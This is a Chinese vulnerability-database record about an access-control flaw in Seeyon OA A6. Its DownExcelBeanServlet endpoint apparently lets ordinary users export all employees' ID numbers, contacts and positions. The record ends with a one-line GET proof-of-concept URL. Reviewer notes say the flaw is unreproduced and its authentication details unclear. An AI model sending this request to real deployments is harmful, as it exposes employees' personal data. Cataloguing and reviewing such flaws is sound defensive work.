---
source: "hatch 补库批 20260928"
title: "致远A6 DownExcelBeanServlet人员数据越权导出"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6；系统管理功能暴露给普通用户"
prerequisites: "任意用户是否已登录不明确，叙述为权限越权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%BA%8C%EF%BC%89.md"
id: "vw-f213ce4f51acb05b84fefc9b"
entity_id: "ve-f213ce4f51acb05b84fefc9b"
schema_version: "1"
---

# 致远A6 DownExcelBeanServlet人员数据越权导出

## 条目说明

- 对象与具体问题：致远A6；DownExcelBeanServlet人员数据越权导出
- 版本、配置及部署条件：A6；系统管理功能暴露给普通用户
- 认证与权限前提：任意用户是否已登录不明确，叙述为权限越权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 需明确普通已登录用户与未认证的区别，不应写完全未授权
- 仅GET参数缺返回字段/权限对照；涉及身份证和联系方式应使用脱敏证据
- 标题二过泛，改接口+垂直越权/数据导出

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

###### 漏洞位置:

    http://www.0-sec.org/yyoa/DownExcelBeanServlet

###### 漏洞详情:

    版本:A6只有系统管理才有的权限，但是任意用户都可以访问。可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。

###### 请求方式:

    Get

###### POC:

    http://www.0-sec.org/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=
